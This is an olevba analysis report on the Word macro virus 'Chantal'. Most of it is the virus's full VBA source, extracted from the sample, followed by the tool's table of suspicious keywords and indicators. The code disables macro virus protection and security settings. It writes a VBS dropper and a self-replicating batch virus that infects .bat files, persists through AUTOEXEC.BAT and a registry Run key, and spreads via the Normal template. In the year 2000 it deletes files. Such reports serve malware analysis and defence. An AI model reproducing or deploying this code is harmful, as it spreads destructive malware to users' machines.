olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chantal-7ee9a543c2fe30d7cc5b189eddaf0743e5e2791d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chantal-7ee9a543c2fe30d7cc5b189eddaf0743e5e2791d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()


On Error Resume Next
Application.ShowVisualBasicEditor = False
CommandBars("Tools").Controls("macro").Enabled = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
Options.VirusProtection = False
DisableAutoMacros = False
Options.ConfirmConversions = False
ScreeenUpdate = False
ToolsOptionsSave.AutoSave = False
ToolsOptionsSave.GlobalDotPrompt = False
f = FreeFile
Open "c:\windows\system\CB1999.vbs" For Output As #f
Print #f, "Set CB = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #f, "CB.Options.VirusProtection = False"
Print #f, "CB.Options.SaveNormalPrompt = False"
Print #f, "CB.Options.SaveNormalPrompt = False"
Print #f, "CB.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, CB.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
Print #f, "CB.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\CB4.vxd" & Chr(34) & ")"
Print #f, "CB.Application.Quit"
Close #f
f = FreeFile
Open "c:\CB2.BAT" For Output As #f
Print #f, "@echo off%[CB2_B]%"
Print #f, "IF '%1=='## GOTO CB2_%2"
Print #f, "ATTRIB C:\CB2.BAT +h"
Print #f, "IF EXIST C:\CB2.BAT GOTO CB2_"
Print #f, "IF NOT EXIST %0.BAT GOTO CB2_END"
Print #f, "FIND " & Chr(34) & "CB2" & Chr(34) & "<%0.BAT>C:\CB2.BAT"
Print #f, ":CB2_"
Print #f, "COMMAND /e:5000 /c C:\CB2 ## RUN"
Print #f, "GOTO CB2_END"
Print #f, ":CB2_RUN"
Print #f, "FOR %%i IN (*.bat ..\*.bat) DO CALL C:\CB2 ## INF %%i"
Print #f, "EXIT CB2"
Print #f, ":CB2_INF"
Print #f, "IF '%CB2%=='1111111111111 EXIT"
Print #f, "SET CB2=%CB2%1"
Print #f, "FIND " & Chr(34) & "CB2" & Chr(34) & "<%3>NUL"
Print #f, "IF NOT ERRORLEVEL 1 goto CB2_END"
Print #f, "TYPE %3>CB2"
Print #f, "TYPE C:\CB2.BAT>>CB2"
Print #f, "MOVE CB2 %3>NUL"
Print #f, "EXIT CB2"
Print #f, ":CB2_END"
Close #f
f = FreeFile
Open "C:\AUTOEXEC.BAT" For Input As #f
Do Until EOF(f)
Input #f, ASD
If ASD = "@CB2.BAT" Then GoTo FDBAT
Loop
Close
f = FreeFile
Open "C:\AUTOEXEC.BAT" For Input As #f
K = FreeFile
Open "C:\AUTOEXEC.TMP" For Output As #K
Do Until EOF(f)
Input #f, ASD
Print #K, ASD
Loop
Print #K, "@CB2.BAT"
Close
Kill "AUTOEXEC.BAT"
Name "AUTOEXEC.TMP" As "AUTOEXEC.BAT"
FDBAT:
Close
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Chantal 4ever!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "Version") = "CB1999"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "CB") = "C:\WINDOWS\SYSTEM\CB1999.vbs"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Chantal B. 4ever!", 0, "Mark says..."
If Day(Now) = 31 Then
Assistant.Visible = True
With Assistant.NewBalloon
    .Animation = msoAnimationListensToComputer
    .Button = msoButtonSetOK
    .Heading = "Mark says..."
    .Text = "Chantal B. 4ever!"
    .Show
End With
End If

    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            NormalTemplate.Save
    Else
    End If
NormalTemplate.VBProject.VBComponents.Item(1).export ("c:\windows\system\CB4.tmp")
f = FreeFile
Open "c:\windows\system\CB4.tmp" For Input As #f
j = FreeFile
Open "c:\windows\CB4.vxd" For Output As #j
For a = 1 To 8: Input #f, b: Next
Do Until EOF(f)
Input #f, b
Print #j, b
Loop
Close #j
Close #f
Kill "c:\windows\system\CB4.tmp"
Y2KEnd:
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "CHANTAL B. 4ever - Hennie & Mark"
            .Execute
        End With
NormalTemplate.Save
ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Chantal-7ee9a543c2fe30d7cc5b189eddaf0743e5e2791d - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CB1999.vbs          |Executable file name                         |
|IOC       |CB2.BAT             |Executable file name                         |
|IOC       |0.BAT               |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
